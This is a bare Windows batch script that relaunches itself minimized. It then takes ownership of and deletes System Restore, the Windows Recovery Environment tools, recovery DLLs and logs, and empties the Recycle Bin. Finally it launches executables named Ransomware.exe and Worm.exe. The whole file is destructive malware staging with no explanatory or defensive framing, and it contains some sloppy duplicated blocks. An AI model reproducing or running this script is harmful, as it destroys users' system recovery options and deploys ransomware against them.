if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit

TAKEOWN /F "C:\Windows\System32\rstrui.exe"
ICACLS "C:\Windows\System32\rstrui.exe" /grant %username%:F
cd C:\Windows\System32
del rstrui.exe
REAGENTC.EXE /disable
REAGENTC.EXE /disable /logpath C:\Temp\Reagent.log
REAGENTC.EXE /disable /logpath C:\Windows\Logs\Reagent
TAKEOWN /F "C:\Windows\System32\ReAgentc.exe"
ICACLS "C:\Windows\System32\ReAgentc.exe" /grant %username%:F
cd C:\Windows\System32
del ReAgentc.exe
TAKEOWN /F "C:\Windows\Logs\ReAgent\ReAgent.log"
ICACLS "C:\Windows\Logs\ReAgent\ReAgent.log" /grant %username%:F
cd C:\Windows\Logs\ReAgent
del ReAgent.log.
TAKEOWN /F "C:\Windows\Logs\WinREAgent\diagerr.xml"
ICACLS "C:\Windows\Logs\WinREAgent\diagerr.xml" /grant %username%:F
cd C:\Windows\Logs\WinREAgent
del diagerr.xml
TAKEOWN /F "C:\Windows\Logs\WinREAgent\diagwrn.xml"
ICACLS "C:\Windows\Logs\WinREAgent\diagwrn.xml" /grant %username%:F
cd C:\Windows\Logs\WinREAgent
del diagwrn.xml
TAKEOWN /F "C:\Windows\System32\Recovery\ReAgent.xml"
ICACLS "C:\Windows\Logs\WinREAgent\diagwrn.xml" /grant %username%:F
cd C:\Windows\Logs\WinREAgent
del diagwrn.xml
TAKEOWN /F "C:\Windows\System32\Recovery\ReAgent.dll"
ICACLS "C:\Windows\System32\Recovery\ReAgent.dll" /grant %username%:F
cd C:\Windows\System32\Recovery
del ReAgent.dll
TAKEOWN /F "C:\Windows\System32\Recovery\ReAgentTask.dll"
ICACLS "C:\Windows\System32\Recovery\ReAgentTask.dll" /grant %username%:F
cd C:\Windows\System32\Recovery
del ReAgentTask.dll
TAKEOWN /F "C:\Windows\System32\Recovery\recdisc.exe"
ICACLS "C:\Windows\System32\Recovery\recdisc.exe" /grant %username%:F
cd C:\Windows\System32\Recovery
del recdisc.exe
TAKEOWN /F "C:\Windows\System32\Recovery\recovery.exe"
ICACLS "C:\Windows\System32\Recovery\recovery.exe" /grant %username%:F
cd C:\Windows\System32\Recovery
del recovery.exe
TAKEOWN /F "C:\Windows\System32\Recovery\recovery.dll"
ICACLS "C:\Windows\System32\Recovery\recovery.dll" /grant %username%:F
cd C:\Windows\System32\Recovery
del recovery.dll
TAKEOWN /F "C:\Windows\System32\Recovery\recovery.dll"
ICACLS "C:\Windows\System32\Recovery\recovery.dll" /grant %username%:F
cd C:\Windows\System32\Recovery
del recovery.dll
TAKEOWN /F "C:\Windows\System32\Recovery\RecoveryDrive.exe"
ICACLS "C:\Windows\System32\Recovery\RecoveryDrive.exe" /grant %username%:F
cd C:\Windows\System32\Recovery
del RecoveryDrive.exe
rd /s /q C:\$Recycle.Bin
cd C:\configuration
Ransomware.exe
Worm.exe
exit
